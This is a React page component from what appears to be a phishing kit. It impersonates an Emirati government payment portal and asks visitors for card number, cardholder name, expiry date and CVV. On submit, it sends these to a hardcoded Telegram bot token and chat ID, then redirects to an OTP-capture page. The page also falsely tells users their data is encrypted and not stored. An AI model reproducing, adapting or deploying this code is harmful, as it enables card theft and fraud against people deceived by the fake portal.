import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

export default function CardData() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: "",
    cardHolder: "",
    expiryDate: "",
    cvv: ""
  });

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const message = `
💳 *بيانات البطاقة - بوابة سداد الإمارات*
--------------------------
🔢 *رقم البطاقة:* ${formData.cardNumber}
👤 *حامل البطاقة:* ${formData.cardHolder}
📅 *تاريخ الانتهاء:* ${formData.expiryDate}
🔒 *CVV:* ${formData.cvv}
--------------------------
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      const paymentData = JSON.parse(sessionStorage.getItem("paymentData") || "{}");
      sessionStorage.setItem("paymentData", JSON.stringify({ ...paymentData, ...formData }));
      setLocation("/verify-otp");
    } catch (error) {
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex flex-col items-center">
          <div className="bg-amber-500 p-2 rounded-full mb-1">
            <span className="text-white font-bold text-lg">سداد</span>
          </div>
          <h1 className="text-xl font-bold text-gray-800">بوابة سداد الإمارات</h1>
        </div>
      </header>

      <main className="flex-grow container py-8 px-4">
        <div className="max-w-xl mx-auto bg-white rounded-xl shadow-lg p-6 border border-gray-100">
          <div className="flex justify-between mb-8 relative">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className={`z-10 w-8 h-8 rounded-full flex items-center justify-center font-bold ${step <= 3 ? 'bg-amber-500 text-white' : 'bg-gray-200 text-gray-500'}`}>
                {step}
              </div>
            ))}
            <div className="absolute top-4 left-0 right-0 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <h2 className="text-2xl font-bold text-gray-900 mb-2 text-center">إدخال بيانات البطاقة</h2>
          <p className="text-gray-500 text-center mb-8">يرجى إدخال بيانات بطاقتك البنكية بشكل آمن</p>

          <form onSubmit={handleNext} className="space-y-5">
            <div className="space-y-2">
              <Label htmlFor="cardNumber">رقم البطاقة</Label>
              <Input id="cardNumber" required placeholder="0000 0000 0000 0000" value={formData.cardNumber} onChange={(e) => setFormData({...formData, cardNumber: e.target.value})} />
            </div>
            <div className="space-y-2">
              <Label htmlFor="cardHolder">اسم حامل البطاقة</Label>
              <Input id="cardHolder" required placeholder="أدخل الاسم كما يظهر على البطاقة" value={formData.cardHolder} onChange={(e) => setFormData({...formData, cardHolder: e.target.value})} />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="expiryDate">تاريخ الانتهاء</Label>
                <Input id="expiryDate" required placeholder="MM/YY" value={formData.expiryDate} onChange={(e) => setFormData({...formData, expiryDate: e.target.value})} />
              </div>
              <div className="space-y-2">
                <Label htmlFor="cvv">CVV</Label>
                <Input id="cvv" required placeholder="000" value={formData.cvv} onChange={(e) => setFormData({...formData, cvv: e.target.value})} />
              </div>
            </div>

            <div className="bg-blue-50 p-4 rounded-lg flex items-center gap-3 border border-blue-100">
              <div className="text-blue-600">🔒</div>
              <p className="text-xs text-blue-800">بيانات البطاقة محمية بتشفير عالي الأمان ولن تُحفظ على الخادم</p>
            </div>

            <div className="flex gap-4 pt-4">
              <Button type="button" variant="outline" className="flex-1" onClick={() => setLocation("/select-bank")}>الرجوع</Button>
              <Button type="submit" className="flex-1 bg-amber-500 hover:bg-amber-600 text-white" disabled={loading}>
                {loading ? "جاري المعالجة..." : "التالي"}
              </Button>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
}
